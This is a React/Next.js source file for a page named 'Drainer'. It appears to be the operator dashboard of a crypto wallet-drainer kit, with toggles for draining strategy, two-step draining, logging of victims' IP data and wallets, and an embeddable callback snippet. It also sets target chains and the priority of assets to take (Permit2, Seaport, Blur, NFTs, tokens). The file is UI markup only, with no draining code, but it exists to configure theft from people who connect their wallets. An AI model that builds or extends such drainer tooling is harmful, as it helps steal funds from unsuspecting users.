import {
  ButtonField,
  CallbackField,
  Layout,
  Paragraph,
  Title,
} from "@/components";
import AccordionCollapse from "@/components/Accordion/Accordion";
import Checkbox from "@/components/Input/checkbox";

export default function Drainer() {
  return (
    <Layout>
      <div className="w-full h-auto p-4 grid grid-cols-7 items-start gap-4">
        <div className="col-span-4 flex flex-col justify-start gap-4">
          <div className="w-full h-auto bg-[#0C091A] py-3 px-5 rounded-xl">
            <AccordionCollapse title="Misc Settings">
              <div className="grid grid-cols-2 gap-y-4 gap-x-8">
                <div className="flex justify-between items-center">
                  <span className="text-[#F5F5F5] text-base font-normal">
                    Log Draining Strategy
                  </span>
                  <Checkbox id={"checkbox"} checked={false} />
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-[#F5F5F5] text-base font-normal">
                    Log IP Data
                  </span>
                  <Checkbox id={"checkbox1"} checked={false} />
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-[#F5F5F5] text-base font-normal">
                    Log Empty Wallets
                  </span>
                  <Checkbox id={"checkbox2"} checked={true} />
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-[#F5F5F5] text-base font-normal">
                    Log Prompting
                  </span>
                  <Checkbox id={"checkbox3"} checked={false} />
                </div>
              </div>
              <form action="#" className="w-full h-auto my-4">
                <Title>Callback Function</Title>
                <Paragraph
                  title={"Add this code in any place on page to enable it:"}
                />
                <CallbackField
                  id={"callBack"}
                  placeholder="Add this code in any place on page to enable it:"
                />
              </form>
            </AccordionCollapse>
          </div>

          <div className="w-full h-auto bg-[#0C091A] py-3 px-5 rounded-xl">
            <AccordionCollapse title="Chains Settings">
              <div className="w-full h-auto flex justify-between items-center">
                <span className="text-[#F5F5F5] text-base font-normal">
                  Two Step Draining
                </span>
                <Checkbox id={"checkbox4"} checked={false} />
              </div>
              <div className="w-full h-auto my-4 grid grid-cols-2 gap-4">
                <ButtonField
                  id={"btn"}
                  placeholder="connectButton"
                  title="Connect Button Class"
                />
                <ButtonField
                  id={"btn1"}
                  placeholder="startButton"
                  title="Two Step Class"
                />
              </div>
              <div className="w-full h-auto my-2 grid grid-cols-2 gap-y-2 gap-x-12">
                <div className="w-full h-auto flex justify-between items-center">
                  <span className="text-[#F5F5F5] text-base font-normal">
                    Ethereum
                  </span>
                  <Checkbox id={"Ethereum"} checked={false} />
                </div>
                <div className="w-full h-auto flex justify-between items-center">
                  <span className="text-[#F5F5F5] text-base font-normal">
                    BSC
                  </span>
                  <Checkbox id={"BSC"} checked={false} />
                </div>
                <div className="w-full h-auto flex justify-between items-center">
                  <span className="text-[#F5F5F5] text-base font-normal">
                    Arbitrum
                  </span>
                  <Checkbox id={"Arbitrum"} checked={true} />
                </div>
                <div className="w-full h-auto flex justify-between items-center">
                  <span className="text-[#F5F5F5] text-base font-normal">
                    Polygon
                  </span>
                  <Checkbox id={"Polygon"} checked={false} />
                </div>
                <div className="w-full h-auto flex justify-between items-center">
                  <span className="text-[#F5F5F5] text-base font-normal">
                    Avalanche
                  </span>
                  <Checkbox id={"Avalanche"} checked={true} />
                </div>
                <div className="w-full h-auto flex justify-between items-center">
                  <span className="text-[#F5F5F5] text-base font-normal">
                    Optimism
                  </span>
                  <Checkbox id={"Optimism"} checked={false} />
                </div>
                <div className="w-full h-auto flex justify-between items-center">
                  <span className="text-[#F5F5F5] text-base font-normal">
                    Fantom
                  </span>
                  <Checkbox id={"Fantom"} checked={true} />
                </div>
                <div className="w-full h-auto flex justify-between items-center">
                  <span className="text-[#F5F5F5] text-base font-normal">
                    Base
                  </span>
                  <Checkbox id={"Base"} checked={false} />
                </div>
              </div>
            </AccordionCollapse>
          </div>

          <div className="w-full h-auto bg-[#0C091A] py-3 px-5 rounded-xl">
            <AccordionCollapse title="Asset Priotiry Settings">
              <div className="w-full h-auto flex justify-between items-center">
                <span className="text-[#F5F5F5] text-base font-normal">
                  Set Custom Asset Priority
                </span>
                <Checkbox id={"checkbox5"} checked={false} />
              </div>
              <div className="w-full h-auto my-2 grid grid-cols-3 gap-y-1 gap-x-4">
                <ButtonField
                  id={"LP"}
                  placeholder="value"
                  title="LP NTFs"
                  value={1}
                />
                <ButtonField
                  id={"Permit2"}
                  placeholder="value"
                  title="Permit2"
                  value={1}
                />
                <ButtonField
                  id={"Blur"}
                  placeholder="value"
                  title="Blur"
                  value={1}
                />
                <ButtonField
                  id={"Seaport"}
                  placeholder="value"
                  title="Seaport"
                  value={1}
                />
                <ButtonField
                  id={"Swap"}
                  placeholder="value"
                  title="Swap"
                  value={1}
                />
                <ButtonField
                  id={"Tokens"}
                  placeholder="value"
                  title="Tokens"
                  value={1}
                />
                <ButtonField
                  id={"NTF"}
                  placeholder="value"
                  title="NTF"
                  value={1}
                />
                <ButtonField
                  id={"Natives"}
                  placeholder="value"
                  title="Natives"
                  value={1}
                />
              </div>
            </AccordionCollapse>
          </div>
        </div>
        <div className="col-span-2 bg-white w-full h-auto ">as</div>
      </div>
    </Layout>
  );
}
